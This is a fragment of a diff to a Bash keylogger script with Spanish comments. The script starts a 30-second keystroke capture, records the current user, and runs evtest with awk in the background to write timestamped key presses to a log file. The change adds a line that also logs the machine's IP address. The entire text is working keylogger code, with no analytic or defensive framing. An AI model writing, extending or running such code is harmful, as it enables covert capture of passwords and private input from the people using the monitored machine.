@@ -21,6 +21,9 @@ echo "[*] Iniciando captura de teclas por 30 segundos..." > "$LOG_FILE"
 # Registrar el usuario actual del que se estan registrando las teclas
 echo "[*] Usuario activo: $(whoami)" >> "$LOG_FILE"
 
+# Registrar la ip de la maquina en el keylog
+echo "[*] IP de la máquina: $(hostname -I | awk '{print $1}')" >> "$LOG_FILE"
+
 # Captura teclas en segundo plano y las guarda en archivo
 evtest "$DEVICE" | awk '/EV_KEY.*DOWN/ {print strftime("[%Y-%m-%d %H:%M:%S]"), $NF}' >> "$LOG_FILE" &
 PID=$!
